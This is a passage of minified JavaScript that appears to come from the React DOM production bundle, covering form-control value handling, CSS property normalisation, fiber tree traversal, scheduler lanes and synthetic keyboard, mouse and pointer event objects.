  if (null != n) "number" === r ? ((0 === n && "" === e.value) || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
  else if ("submit" === r || "reset" === r) return void e.removeAttribute("value");
  t.hasOwnProperty("value") ? et(e, t.type, n) : t.hasOwnProperty("defaultValue") && et(e, t.type, We(t.defaultValue)), null == t.checked && null != t.defaultChecked && (e.defaultChecked = !!t.defaultChecked);
}
function Je(e, t, n) {
  if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
      var r = t.type;
      if (!(("submit" !== r && "reset" !== r) || (void 0 !== t.value && null !== t.value))) return;
      (t = "" + e._wrapperState.initialValue), n || t === e.value || (e.value = t), (e.defaultValue = t);
  }
  "" !== (n = e.name) && (e.name = ""), (e.defaultChecked = !!e._wrapperState.initialChecked), "" !== n && (e.name = n);
}
function et(e, t, n) {
  ("number" === t && Xe(e.ownerDocument) === e) || (null == n ? (e.defaultValue = "" + e._wrapperState.initialValue) : e.defaultValue !== "" + n && (e.defaultValue = "" + n));
}
var tt = Array.isArray;
function nt(e, t, n, r) {
  if (((e = e.options), t)) {
      t = {};
      for (var o = 0; o < n.length; o++) t["$" + n[o]] = !0;
      for (n = 0; n < e.length; n++) (o = t.hasOwnProperty("$" + e[n].value)), e[n].selected !== o && (e[n].selected = o), o && r && (e[n].defaultSelected = !0);
  } else {
      for (n = "" + We(n), t = null, o = 0; o < e.length; o++) {
          if (e[o].value === n) return (e[o].selected = !0), void (r && (e[o].defaultSelected = !0));
          null !== t || e[o].disabled || (t = e[o]);
      }
      null !== t && (t.selected = !0);
  }
}
function rt(e, t) {
  if (null != t.dangerouslySetInnerHTML) throw Error(ae(91));
  return Le({}, t, { value: void 0, defaultValue: void 0, children: "" + e._wrapperState.initialValue });
}
function ot(e, t) {
  var n = t.value;
  if (null == n) {
      if (((n = t.children), (t = t.defaultValue), null != n)) {
          if (null != t) throw Error(ae(92));
          if (tt(n)) {
              if (1 < n.length) throw Error(ae(93));
              n = n[0];
          }
          t = n;
      }
      null == t && (t = ""), (n = t);
  }
  e._wrapperState = { initialValue: We(n) };
}
function at(e, t) {
  var n = We(t.value),
      r = We(t.defaultValue);
  null != n && ((n = "" + n) !== e.value && (e.value = n), null == t.defaultValue && e.defaultValue !== n && (e.defaultValue = n)), null != r && (e.defaultValue = "" + r);
}
function it(e) {
  var t = e.textContent;
  t === e._wrapperState.initialValue && "" !== t && null !== t && (e.value = t);
}
function st(e) {
  switch (e) {
      case "svg":
          return "http://www.w3.org/2000/svg";
      case "math":
          return "http://www.w3.org/1998/Math/MathML";
      default:
          return "http://www.w3.org/1999/xhtml";
  }
}
function lt(e, t) {
  return null == e || "http://www.w3.org/1999/xhtml" === e ? st(t) : "http://www.w3.org/2000/svg" === e && "foreignObject" === t ? "http://www.w3.org/1999/xhtml" : e;
}
var ct,
  ut,
  dt =
      ((ut = function (e, t) {
          if ("http://www.w3.org/2000/svg" !== e.namespaceURI || "innerHTML" in e) e.innerHTML = t;
          else {
              for ((ct = ct || document.createElement("div")).innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = ct.firstChild; e.firstChild; ) e.removeChild(e.firstChild);
              for (; t.firstChild; ) e.appendChild(t.firstChild);
          }
      }),
      "undefined" != typeof MSApp && MSApp.execUnsafeLocalFunction
          ? function (e, t, n, r) {
                MSApp.execUnsafeLocalFunction(function () {
                    return ut(e, t);
                });
            }
          : ut);
function ft(e, t) {
  if (t) {
      var n = e.firstChild;
      if (n && n === e.lastChild && 3 === n.nodeType) return void (n.nodeValue = t);
  }
  e.textContent = t;
}
var pt = {
      animationIterationCount: !0,
      aspectRatio: !0,
      borderImageOutset: !0,
      borderImageSlice: !0,
      borderImageWidth: !0,
      boxFlex: !0,
      boxFlexGroup: !0,
      boxOrdinalGroup: !0,
      columnCount: !0,
      columns: !0,
      flex: !0,
      flexGrow: !0,
      flexPositive: !0,
      flexShrink: !0,
      flexNegative: !0,
      flexOrder: !0,
      gridArea: !0,
      gridRow: !0,
      gridRowEnd: !0,
      gridRowSpan: !0,
      gridRowStart: !0,
      gridColumn: !0,
      gridColumnEnd: !0,
      gridColumnSpan: !0,
      gridColumnStart: !0,
      fontWeight: !0,
      lineClamp: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      tabSize: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0,
      fillOpacity: !0,
      floodOpacity: !0,
      stopOpacity: !0,
      strokeDasharray: !0,
      strokeDashoffset: !0,
      strokeMiterlimit: !0,
      strokeOpacity: !0,
      strokeWidth: !0,
  },
  ht = ["Webkit", "ms", "Moz", "O"];
function mt(e, t, n) {
  return null == t || "boolean" == typeof t || "" === t ? "" : n || "number" != typeof t || 0 === t || (pt.hasOwnProperty(e) && pt[e]) ? ("" + t).trim() : t + "px";
}
function gt(e, t) {
  for (var n in ((e = e.style), t))
      if (t.hasOwnProperty(n)) {
          var r = 0 === n.indexOf("--"),
              o = mt(n, t[n], r);
          "float" === n && (n = "cssFloat"), r ? e.setProperty(n, o) : (e[n] = o);
      }
}
Object.keys(pt).forEach(function (e) {
  ht.forEach(function (t) {
      (t = t + e.charAt(0).toUpperCase() + e.substring(1)), (pt[t] = pt[e]);
  });
});
var vt = Le({ menuitem: !0 }, { area: !0, base: !0, br: !0, col: !0, embed: !0, hr: !0, img: !0, input: !0, keygen: !0, link: !0, meta: !0, param: !0, source: !0, track: !0, wbr: !0 });
function yt(e, t) {
  if (t) {
      if (vt[e] && (null != t.children || null != t.dangerouslySetInnerHTML)) throw Error(ae(137, e));
      if (null != t.dangerouslySetInnerHTML) {
          if (null != t.children) throw Error(ae(60));
          if ("object" != typeof t.dangerouslySetInnerHTML || !("__html" in t.dangerouslySetInnerHTML)) throw Error(ae(61));
      }
      if (null != t.style && "object" != typeof t.style) throw Error(ae(62));
  }
}
function bt(e, t) {
  if (-1 === e.indexOf("-")) return "string" == typeof t.is;
  switch (e) {
      case "annotation-xml":
      case "color-profile":
      case "font-face":
      case "font-face-src":
      case "font-face-uri":
      case "font-face-format":
      case "font-face-name":
      case "missing-glyph":
          return !1;
      default:
          return !0;
  }
}
var xt = null;
function wt(e) {
  return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement), 3 === e.nodeType ? e.parentNode : e;
}
var St = null,
  kt = null,
  Et = null;
function Ct(e) {
  if ((e = xa(e))) {
      if ("function" != typeof St) throw Error(ae(280));
      var t = e.stateNode;
      t && ((t = Sa(t)), St(e.stateNode, e.type, t));
  }
}
function _t(e) {
  kt ? (Et ? Et.push(e) : (Et = [e])) : (kt = e);
}
function Pt() {
  if (kt) {
      var e = kt,
          t = Et;
      if (((Et = kt = null), Ct(e), t)) for (e = 0; e < t.length; e++) Ct(t[e]);
  }
}
function Tt(e, t) {
  return e(t);
}
function Rt() {}
var zt = !1;
function At(e, t, n) {
  if (zt) return e(t, n);
  zt = !0;
  try {
      return Tt(e, t, n);
  } finally {
      (zt = !1), (null !== kt || null !== Et) && (Rt(), Pt());
  }
}
function jt(e, t) {
  var n = e.stateNode;
  if (null === n) return null;
  var r = Sa(n);
  if (null === r) return null;
  n = r[t];
  e: switch (t) {
      case "onClick":
      case "onClickCapture":
      case "onDoubleClick":
      case "onDoubleClickCapture":
      case "onMouseDown":
      case "onMouseDownCapture":
      case "onMouseMove":
      case "onMouseMoveCapture":
      case "onMouseUp":
      case "onMouseUpCapture":
      case "onMouseEnter":
          (r = !r.disabled) || (r = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)), (e = !r);
          break e;
      default:
          e = !1;
  }
  if (e) return null;
  if (n && "function" != typeof n) throw Error(ae(231, t, typeof n));
  return n;
}
var Ot = !1;
if (ue)
  try {
      var Ft = {};
      Object.defineProperty(Ft, "passive", {
          get: function () {
              Ot = !0;
          },
      }),
          window.addEventListener("test", Ft, Ft),
          window.removeEventListener("test", Ft, Ft);
  } catch (ut) {
      Ot = !1;
  }
function Nt(e, t, n, r, o, a, i, s, l) {
  var c = Array.prototype.slice.call(arguments, 3);
  try {
      t.apply(n, c);
  } catch (u) {
      this.onError(u);
  }
}
var Mt = !1,
  Lt = null,
  Bt = !1,
  It = null,
  Dt = {
      onError: function (e) {
          (Mt = !0), (Lt = e);
      },
  };
function $t(e, t, n, r, o, a, i, s, l) {
  (Mt = !1), (Lt = null), Nt.apply(Dt, arguments);
}
function Vt(e) {
  var t = e,
      n = e;
  if (e.alternate) for (; t.return; ) t = t.return;
  else {
      e = t;
      do {
          0 != (4098 & (t = e).flags) && (n = t.return), (e = t.return);
      } while (e);
  }
  return 3 === t.tag ? n : null;
}
function Ut(e) {
  if (13 === e.tag) {
      var t = e.memoizedState;
      if ((null === t && null !== (e = e.alternate) && (t = e.memoizedState), null !== t)) return t.dehydrated;
  }
  return null;
}
function Wt(e) {
  if (Vt(e) !== e) throw Error(ae(188));
}
function Ht(e) {
  return null !==
      (e = (function (e) {
          var t = e.alternate;
          if (!t) {
              if (null === (t = Vt(e))) throw Error(ae(188));
              return t !== e ? null : e;
          }
          for (var n = e, r = t; ; ) {
              var o = n.return;
              if (null === o) break;
              var a = o.alternate;
              if (null === a) {
                  if (null !== (r = o.return)) {
                      n = r;
                      continue;
                  }
                  break;
              }
              if (o.child === a.child) {
                  for (a = o.child; a; ) {
                      if (a === n) return Wt(o), e;
                      if (a === r) return Wt(o), t;
                      a = a.sibling;
                  }
                  throw Error(ae(188));
              }
              if (n.return !== r.return) (n = o), (r = a);
              else {
                  for (var i = !1, s = o.child; s; ) {
                      if (s === n) {
                          (i = !0), (n = o), (r = a);
                          break;
                      }
                      if (s === r) {
                          (i = !0), (r = o), (n = a);
                          break;
                      }
                      s = s.sibling;
                  }
                  if (!i) {
                      for (s = a.child; s; ) {
                          if (s === n) {
                              (i = !0), (n = a), (r = o);
                              break;
                          }
                          if (s === r) {
                              (i = !0), (r = a), (n = o);
                              break;
                          }
                          s = s.sibling;
                      }
                      if (!i) throw Error(ae(189));
                  }
              }
              if (n.alternate !== r) throw Error(ae(190));
          }
          if (3 !== n.tag) throw Error(ae(188));
          return n.stateNode.current === n ? e : t;
      })(e))
      ? qt(e)
      : null;
}
function qt(e) {
  if (5 === e.tag || 6 === e.tag) return e;
  for (e = e.child; null !== e; ) {
      var t = qt(e);
      if (null !== t) return t;
      e = e.sibling;
  }
  return null;
}
var Yt = oe.unstable_scheduleCallback,
  Xt = oe.unstable_cancelCallback,
  Gt = oe.unstable_shouldYield,
  Qt = oe.unstable_requestPaint,
  Kt = oe.unstable_now,
  Zt = oe.unstable_getCurrentPriorityLevel,
  Jt = oe.unstable_ImmediatePriority,
  en = oe.unstable_UserBlockingPriority,
  tn = oe.unstable_NormalPriority,
  nn = oe.unstable_LowPriority,
  rn = oe.unstable_IdlePriority,
  on = null,
  an = null;
var sn = Math.clz32
      ? Math.clz32
      : function (e) {
            return (e >>>= 0), 0 === e ? 32 : (31 - ((ln(e) / cn) | 0)) | 0;
        },
  ln = Math.log,
  cn = Math.LN2;
var un = 64,
  dn = 4194304;
function fn(e) {
  switch (e & -e) {
      case 1:
          return 1;
      case 2:
          return 2;
      case 4:
          return 4;
      case 8:
          return 8;
      case 16:
          return 16;
      case 32:
          return 32;
      case 64:
      case 128:
      case 256:
      case 512:
      case 1024:
      case 2048:
      case 4096:
      case 8192:
      case 16384:
      case 32768:
      case 65536:
      case 131072:
      case 262144:
      case 524288:
      case 1048576:
      case 2097152:
          return 4194240 & e;
      case 4194304:
      case 8388608:
      case 16777216:
      case 33554432:
      case 67108864:
          return 130023424 & e;
      case 134217728:
          return 134217728;
      case 268435456:
          return 268435456;
      case 536870912:
          return 536870912;
      case 1073741824:
          return 1073741824;
      default:
          return e;
  }
}
function pn(e, t) {
  var n = e.pendingLanes;
  if (0 === n) return 0;
  var r = 0,
      o = e.suspendedLanes,
      a = e.pingedLanes,
      i = 268435455 & n;
  if (0 !== i) {
      var s = i & ~o;
      0 !== s ? (r = fn(s)) : 0 !== (a &= i) && (r = fn(a));
  } else 0 !== (i = n & ~o) ? (r = fn(i)) : 0 !== a && (r = fn(a));
  if (0 === r) return 0;
  if (0 !== t && t !== r && 0 == (t & o) && ((o = r & -r) >= (a = t & -t) || (16 === o && 0 != (4194240 & a)))) return t;
  if ((0 != (4 & r) && (r |= 16 & n), 0 !== (t = e.entangledLanes))) for (e = e.entanglements, t &= r; 0 < t; ) (o = 1 << (n = 31 - sn(t))), (r |= e[n]), (t &= ~o);
  return r;
}
function hn(e, t) {
  switch (e) {
      case 1:
      case 2:
      case 4:
          return t + 250;
      case 8:
      case 16:
      case 32:
      case 64:
      case 128:
      case 256:
      case 512:
      case 1024:
      case 2048:
      case 4096:
      case 8192:
      case 16384:
      case 32768:
      case 65536:
      case 131072:
      case 262144:
      case 524288:
      case 1048576:
      case 2097152:
          return t + 5e3;
      default:
          return -1;
  }
}
function mn(e) {
  return 0 !== (e = -1073741825 & e.pendingLanes) ? e : 1073741824 & e ? 1073741824 : 0;
}
function gn() {
  var e = un;
  return 0 == (4194240 & (un <<= 1)) && (un = 64), e;
}
function vn(e) {
  for (var t = [], n = 0; 31 > n; n++) t.push(e);
  return t;
}
function yn(e, t, n) {
  (e.pendingLanes |= t), 536870912 !== t && ((e.suspendedLanes = 0), (e.pingedLanes = 0)), ((e = e.eventTimes)[(t = 31 - sn(t))] = n);
}
function bn(e, t) {
  var n = (e.entangledLanes |= t);
  for (e = e.entanglements; n; ) {
      var r = 31 - sn(n),
          o = 1 << r;
      (o & t) | (e[r] & t) && (e[r] |= t), (n &= ~o);
  }
}
var xn = 0;
function wn(e) {
  return 1 < (e &= -e) ? (4 < e ? (0 != (268435455 & e) ? 16 : 536870912) : 4) : 1;
}
var Sn,
  kn,
  En,
  Cn,
  _n,
  Pn = !1,
  Tn = [],
  Rn = null,
  zn = null,
  An = null,
  jn = new Map(),
  On = new Map(),
  Fn = [],
  Nn = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
      " "
  );
function Mn(e, t) {
  switch (e) {
      case "focusin":
      case "focusout":
          Rn = null;
          break;
      case "dragenter":
      case "dragleave":
          zn = null;
          break;
      case "mouseover":
      case "mouseout":
          An = null;
          break;
      case "pointerover":
      case "pointerout":
          jn.delete(t.pointerId);
          break;
      case "gotpointercapture":
      case "lostpointercapture":
          On.delete(t.pointerId);
  }
}
function Ln(e, t, n, r, o, a) {
  return null === e || e.nativeEvent !== a
      ? ((e = { blockedOn: t, domEventName: n, eventSystemFlags: r, nativeEvent: a, targetContainers: [o] }), null !== t && null !== (t = xa(t)) && kn(t), e)
      : ((e.eventSystemFlags |= r), (t = e.targetContainers), null !== o && -1 === t.indexOf(o) && t.push(o), e);
}
function Bn(e) {
  var t = ba(e.target);
  if (null !== t) {
      var n = Vt(t);
      if (null !== n)
          if (13 === (t = n.tag)) {
              if (null !== (t = Ut(n)))
                  return (
                      (e.blockedOn = t),
                      void _n(e.priority, function () {
                          En(n);
                      })
                  );
          } else if (3 === t && n.stateNode.current.memoizedState.isDehydrated) return void (e.blockedOn = 3 === n.tag ? n.stateNode.containerInfo : null);
  }
  e.blockedOn = null;
}
function In(e) {
  if (null !== e.blockedOn) return !1;
  for (var t = e.targetContainers; 0 < t.length; ) {
      var n = Qn(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
      if (null !== n) return null !== (t = xa(n)) && kn(t), (e.blockedOn = n), !1;
      var r = new (n = e.nativeEvent).constructor(n.type, n);
      (xt = r), n.target.dispatchEvent(r), (xt = null), t.shift();
  }
  return !0;
}
function Dn(e, t, n) {
  In(e) && n.delete(t);
}
function $n() {
  (Pn = !1), null !== Rn && In(Rn) && (Rn = null), null !== zn && In(zn) && (zn = null), null !== An && In(An) && (An = null), jn.forEach(Dn), On.forEach(Dn);
}
function Vn(e, t) {
  e.blockedOn === t && ((e.blockedOn = null), Pn || ((Pn = !0), oe.unstable_scheduleCallback(oe.unstable_NormalPriority, $n)));
}
function Un(e) {
  function t(t) {
      return Vn(t, e);
  }
  if (0 < Tn.length) {
      Vn(Tn[0], e);
      for (var n = 1; n < Tn.length; n++) {
          var r = Tn[n];
          r.blockedOn === e && (r.blockedOn = null);
      }
  }
  for (null !== Rn && Vn(Rn, e), null !== zn && Vn(zn, e), null !== An && Vn(An, e), jn.forEach(t), On.forEach(t), n = 0; n < Fn.length; n++) (r = Fn[n]).blockedOn === e && (r.blockedOn = null);
  for (; 0 < Fn.length && null === (n = Fn[0]).blockedOn; ) Bn(n), null === n.blockedOn && Fn.shift();
}
var Wn = xe.ReactCurrentBatchConfig,
  Hn = !0;
function qn(e, t, n, r) {
  var o = xn,
      a = Wn.transition;
  Wn.transition = null;
  try {
      (xn = 1), Xn(e, t, n, r);
  } finally {
      (xn = o), (Wn.transition = a);
  }
}
function Yn(e, t, n, r) {
  var o = xn,
      a = Wn.transition;
  Wn.transition = null;
  try {
      (xn = 4), Xn(e, t, n, r);
  } finally {
      (xn = o), (Wn.transition = a);
  }
}
function Xn(e, t, n, r) {
  if (Hn) {
      var o = Qn(e, t, n, r);
      if (null === o) Ho(e, t, r, Gn, n), Mn(e, r);
      else if (
          (function (e, t, n, r, o) {
              switch (t) {
                  case "focusin":
                      return (Rn = Ln(Rn, e, t, n, r, o)), !0;
                  case "dragenter":
                      return (zn = Ln(zn, e, t, n, r, o)), !0;
                  case "mouseover":
                      return (An = Ln(An, e, t, n, r, o)), !0;
                  case "pointerover":
                      var a = o.pointerId;
                      return jn.set(a, Ln(jn.get(a) || null, e, t, n, r, o)), !0;
                  case "gotpointercapture":
                      return (a = o.pointerId), On.set(a, Ln(On.get(a) || null, e, t, n, r, o)), !0;
              }
              return !1;
          })(o, e, t, n, r)
      )
          r.stopPropagation();
      else if ((Mn(e, r), 4 & t && -1 < Nn.indexOf(e))) {
          for (; null !== o; ) {
              var a = xa(o);
              if ((null !== a && Sn(a), null === (a = Qn(e, t, n, r)) && Ho(e, t, r, Gn, n), a === o)) break;
              o = a;
          }
          null !== o && r.stopPropagation();
      } else Ho(e, t, r, null, n);
  }
}
var Gn = null;
function Qn(e, t, n, r) {
  if (((Gn = null), null !== (e = ba((e = wt(r))))))
      if (null === (t = Vt(e))) e = null;
      else if (13 === (n = t.tag)) {
          if (null !== (e = Ut(t))) return e;
          e = null;
      } else if (3 === n) {
          if (t.stateNode.current.memoizedState.isDehydrated) return 3 === t.tag ? t.stateNode.containerInfo : null;
          e = null;
      } else t !== e && (e = null);
  return (Gn = e), null;
}
function Kn(e) {
  switch (e) {
      case "cancel":
      case "click":
      case "close":
      case "contextmenu":
      case "copy":
      case "cut":
      case "auxclick":
      case "dblclick":
      case "dragend":
      case "dragstart":
      case "drop":
      case "focusin":
      case "focusout":
      case "input":
      case "invalid":
      case "keydown":
      case "keypress":
      case "keyup":
      case "mousedown":
      case "mouseup":
      case "paste":
      case "pause":
      case "play":
      case "pointercancel":
      case "pointerdown":
      case "pointerup":
      case "ratechange":
      case "reset":
      case "resize":
      case "seeked":
      case "submit":
      case "touchcancel":
      case "touchend":
      case "touchstart":
      case "volumechange":
      case "change":
      case "selectionchange":
      case "textInput":
      case "compositionstart":
      case "compositionend":
      case "compositionupdate":
      case "beforeblur":
      case "afterblur":
      case "beforeinput":
      case "blur":
      case "fullscreenchange":
      case "focus":
      case "hashchange":
      case "popstate":
      case "select":
      case "selectstart":
          return 1;
      case "drag":
      case "dragenter":
      case "dragexit":
      case "dragleave":
      case "dragover":
      case "mousemove":
      case "mouseout":
      case "mouseover":
      case "pointermove":
      case "pointerout":
      case "pointerover":
      case "scroll":
      case "toggle":
      case "touchmove":
      case "wheel":
      case "mouseenter":
      case "mouseleave":
      case "pointerenter":
      case "pointerleave":
          return 4;
      case "message":
          switch (Zt()) {
              case Jt:
                  return 1;
              case en:
                  return 4;
              case tn:
              case nn:
                  return 16;
              case rn:
                  return 536870912;
              default:
                  return 16;
          }
      default:
          return 16;
  }
}
var Zn = null,
  Jn = null,
  er = null;
function tr() {
  if (er) return er;
  var e,
      t,
      n = Jn,
      r = n.length,
      o = "value" in Zn ? Zn.value : Zn.textContent,
      a = o.length;
  for (e = 0; e < r && n[e] === o[e]; e++);
  var i = r - e;
  for (t = 1; t <= i && n[r - t] === o[a - t]; t++);
  return (er = o.slice(e, 1 < t ? 1 - t : void 0));
}
function nr(e) {
  var t = e.keyCode;
  return "charCode" in e ? 0 === (e = e.charCode) && 13 === t && (e = 13) : (e = t), 10 === e && (e = 13), 32 <= e || 13 === e ? e : 0;
}
function rr() {
  return !0;
}
function or() {
  return !1;
}
function ar(e) {
  function t(t, n, r, o, a) {
      for (var i in ((this._reactName = t), (this._targetInst = r), (this.type = n), (this.nativeEvent = o), (this.target = a), (this.currentTarget = null), e)) e.hasOwnProperty(i) && ((t = e[i]), (this[i] = t ? t(o) : o[i]));
      return (this.isDefaultPrevented = (null != o.defaultPrevented ? o.defaultPrevented : !1 === o.returnValue) ? rr : or), (this.isPropagationStopped = or), this;
  }
  return (
      Le(t.prototype, {
          preventDefault: function () {
              this.defaultPrevented = !0;
              var e = this.nativeEvent;
              e && (e.preventDefault ? e.preventDefault() : "unknown" != typeof e.returnValue && (e.returnValue = !1), (this.isDefaultPrevented = rr));
          },
          stopPropagation: function () {
              var e = this.nativeEvent;
              e && (e.stopPropagation ? e.stopPropagation() : "unknown" != typeof e.cancelBubble && (e.cancelBubble = !0), (this.isPropagationStopped = rr));
          },
          persist: function () {},
          isPersistent: rr,
      }),
      t
  );
}
var ir,
  sr,
  lr,
  cr = {
      eventPhase: 0,
      bubbles: 0,
      cancelable: 0,
      timeStamp: function (e) {
          return e.timeStamp || Date.now();
      },
      defaultPrevented: 0,
      isTrusted: 0,
  },
  ur = ar(cr),
  dr = Le({}, cr, { view: 0, detail: 0 }),
  fr = ar(dr),
  pr = Le({}, dr, {
      screenX: 0,
      screenY: 0,
      clientX: 0,
      clientY: 0,
      pageX: 0,
      pageY: 0,
      ctrlKey: 0,
      shiftKey: 0,
      altKey: 0,
      metaKey: 0,
      getModifierState: Cr,
      button: 0,
      buttons: 0,
      relatedTarget: function (e) {
          return void 0 === e.relatedTarget ? (e.fromElement === e.srcElement ? e.toElement : e.fromElement) : e.relatedTarget;
      },
      movementX: function (e) {
          return "movementX" in e ? e.movementX : (e !== lr && (lr && "mousemove" === e.type ? ((ir = e.screenX - lr.screenX), (sr = e.screenY - lr.screenY)) : (sr = ir = 0), (lr = e)), ir);
      },
      movementY: function (e) {
          return "movementY" in e ? e.movementY : sr;
      },
  }),
  hr = ar(pr),
  mr = ar(Le({}, pr, { dataTransfer: 0 })),
  gr = ar(Le({}, dr, { relatedTarget: 0 })),
  vr = ar(Le({}, cr, { animationName: 0, elapsedTime: 0, pseudoElement: 0 })),
  yr = Le({}, cr, {
      clipboardData: function (e) {
          return "clipboardData" in e ? e.clipboardData : window.clipboardData;
      },
  }),
  br = ar(yr),
  xr = ar(Le({}, cr, { data: 0 })),
  wr = { Esc: "Escape", Spacebar: " ", Left: "ArrowLeft", Up: "ArrowUp", Right: "ArrowRight", Down: "ArrowDown", Del: "Delete", Win: "OS", Menu: "ContextMenu", Apps: "ContextMenu", Scroll: "ScrollLock", MozPrintableKey: "Unidentified" },
  Sr = {
      8: "Backspace",
      9: "Tab",
      12: "Clear",
      13: "Enter",
      16: "Shift",
      17: "Control",
      18: "Alt",
      19: "Pause",
      20: "CapsLock",
      27: "Escape",
      32: " ",
      33: "PageUp",
      34: "PageDown",
      35: "End",
      36: "Home",
      37: "ArrowLeft",
      38: "ArrowUp",
      39: "ArrowRight",
      40: "ArrowDown",
      45: "Insert",
      46: "Delete",
      112: "F1",
      113: "F2",
      114: "F3",
      115: "F4",
      116: "F5",
      117: "F6",
      118: "F7",
      119: "F8",
      120: "F9",
      121: "F10",
      122: "F11",
      123: "F12",
      144: "NumLock",
      145: "ScrollLock",
      224: "Meta",
  },
  kr = { Alt: "altKey", Control: "ctrlKey", Meta: "metaKey", Shift: "shiftKey" };
function Er(e) {
  var t = this.nativeEvent;
  return t.getModifierState ? t.getModifierState(e) : !!(e = kr[e]) && !!t[e];
}
function Cr() {
  return Er;
}
var _r = Le({}, dr, {
      key: function (e) {
          if (e.key) {
              var t = wr[e.key] || e.key;
              if ("Unidentified" !== t) return t;
          }
          return "keypress" === e.type ? (13 === (e = nr(e)) ? "Enter" : String.fromCharCode(e)) : "keydown" === e.type || "keyup" === e.type ? Sr[e.keyCode] || "Unidentified" : "";
      },
      code: 0,
      location: 0,
      ctrlKey: 0,
      shiftKey: 0,
      altKey: 0,
      metaKey: 0,
      repeat: 0,
      locale: 0,
      getModifierState: Cr,
      charCode: function (e) {
          return "keypress" === e.type ? nr(e) : 0;
      },
      keyCode: function (e) {
          return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
      },
      which: function (e) {
          return "keypress" === e.type ? nr(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
      },
  }),
  Pr = ar(_r),
  Tr = ar(Le({}, pr, { pointerId: 0, width: 0, height: 0, pressure: 0, tangentialPressure: 0, tiltX: 0, tiltY: 0, twist: 0, pointerType: 0, isPrimary: 0 })),
  Rr = ar(Le({}, dr, { touches: 0, targetTouches: 0, changedTouches: 0, altKey: 0, metaKey: 0, ctrlKey: 0, shiftKey: 0, getModifierState: Cr })),
  zr = ar(Le({}, cr, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 })),
  Ar = Le({}, pr, {
      deltaX: function (e) {
          return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0;
      },
      deltaY: function (e) {
          return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0;
      },
      deltaZ: 0,
      deltaMode: 0,
  }),
  jr = ar(Ar),
  Or = [9, 13, 27, 32],
  Fr = ue && "CompositionEvent" in window,
  Nr = null;
ue && "documentMode" in document && (Nr = document.documentMode);
var Mr = ue && "TextEvent" in window && !Nr,
  Lr = ue && (!Fr || (Nr && 8 < Nr && 11 >= Nr)),
  Br = String.fromCharCode(32),
  Ir = !1;
function Dr(e, t) {
  switch (e) {
      case "keyup":
          return -1 !== Or.indexOf(t.keyCode);
      case "keydown":
          return 229 !== t.keyCode;
      case "keypress":
      case "mousedown":
      case "focusout":
          return !0;
      default:
          return !1;
  }
}
function $r(e) {
  return "object" == typeof (e = e.detail) && "data" in e ? e.data : null;
}
var Vr = !1;
var Ur = { color: !0, date: !0, datetime: !0, "datetime-local": !0, email: !0, month: !0, number: !0, password: !0, range: !0, search: !0, tel: !0, text: !0, time: !0, url: !0, week: !0 };
function Wr(e) {
  var t = e && e.nodeName && e.nodeName.toLowerCase();
  return "input" === t ? !!Ur[e.type] : "textarea" === t;
}
function Hr(e, t, n, r) {
  _t(r), 0 < (t = Yo(t, "onChange")).length && ((n = new ur("onChange", "change", null, n, r)), e.push({ event: n, listeners: t }));
}
var qr = null,
  Yr = null;
function Xr(e) {
  Io(e, 0);
}
function Gr(e) {
  if (Ye(wa(e))) return e;
}
function Qr(e, t) {
  if ("change" === e) return t;
}
var Kr = !1;
if (ue) {
  var Zr;
  if (ue) {
      var Jr = "oninput" in document;
      if (!Jr) {
          var eo = document.createElement("div");
          eo.setAttribute("oninput", "return;"), (Jr = "function" == typeof eo.oninput);
      }
      Zr = Jr;
  } else Zr = !1;
  Kr = Zr && (!document.documentMode || 9 < document.documentMode);
}
function to() {
  qr && (qr.detachEvent("onpropertychange", no), (Yr = qr = null));
}
function no(e) {
  if ("value" === e.propertyName && Gr(Yr)) {
      var t = [];
      Hr(t, Yr, e, wt(e)), At(Xr, t);
  }
}
function ro(e, t, n) {
  "focusin" === e ? (to(), (Yr = n), (qr = t).attachEvent("onpropertychange", no)) : "focusout" === e && to();
}
function oo(e) {
  if ("selectionchange" === e || "keyup" === e || "keydown" === e) return Gr(Yr);
}
function ao(e, t) {
  if ("click" === e) return Gr(t);
}
function io(e, t) {
  if ("input" === e || "change" === e) return Gr(t);
}
var so =
  "function" == typeof Object.is
      ? Object.is
      : function (e, t) {
            return (e === t && (0 !== e || 1 / e == 1 / t)) || (e != e && t != t);
        };
function lo(e, t) {
  if (so(e, t)) return !0;
  if ("object" != typeof e || null === e || "object" != typeof t || null === t) return !1;
  var n = Object.keys(e),
      r = Object.keys(t);
  if (n.length !== r.length) return !1;
  for (r = 0; r < n.length; r++) {
      var o = n[r];
      if (!de.call(t, o) || !so(e[o], t[o])) return !1;
  }
  return !0;
}
function co(e) {
  for (; e && e.firstChild; ) e = e.firstChild;
  return e;
}
function uo(e, t) {
  var n,
      r = co(e);
  for (e = 0; r; ) {
      if (3 === r.nodeType) {
          if (((n = e + r.textContent.length), e <= t && n >= t)) return { node: r, offset: t - e };
          e = n;
      }
      e: {
          for (; r; ) {
              if (r.nextSibling) {
                  r = r.nextSibling;
                  break e;
              }
              r = r.parentNode;
          }
          r = void 0;
      }
      r = co(r);
  }
}
function fo(e, t) {
  return !(!e || !t) && (e === t || ((!e || 3 !== e.nodeType) && (t && 3 === t.nodeType ? fo(e, t.parentNode) : "contains" in e ? e.contains(t) : !!e.compareDocumentPosition && !!(16 & e.compareDocumentPosition(t)))));
}
function po() {
  for (var e = window, t = Xe(); t instanceof e.HTMLIFrameElement; ) {
      try {
          var n = "string" == typeof t.contentWindow.location.href;
      } catch (r) {
          n = !1;
      }
      if (!n) break;
      t = Xe((e = t.contentWindow).document);
  }
  return t;
}
function ho(e) {
  var t = e && e.nodeName && e.nodeName.toLowerCase();
